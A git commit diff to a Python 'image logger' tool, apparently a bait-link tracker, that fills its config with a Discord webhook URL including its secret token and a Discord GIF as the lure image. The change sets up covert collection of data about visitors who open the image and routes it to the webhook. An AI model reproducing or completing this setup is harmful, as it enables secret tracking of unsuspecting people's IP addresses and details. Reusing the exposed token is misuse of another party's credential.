7d6f38b01e92210bf5bf025429447bd064171f69
MenfaatsizDevo <avrupaliavras@gmail.com>
2025-03-08 14:34:26 +0300

    Update main.py

--- api/main.py
+++ api/main.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "",
-    "image": "", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1347894864175562825/0-bcadLBuz_RWm_a_Zw9Ym26oT45uXdeQBtqQ4dUYE9oRnpQVmTIkeTgcyXQbbPqTkbY",
+    "image": "https://www.gifcen.com/wp-content/uploads/2021/06/discord-gif-19.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
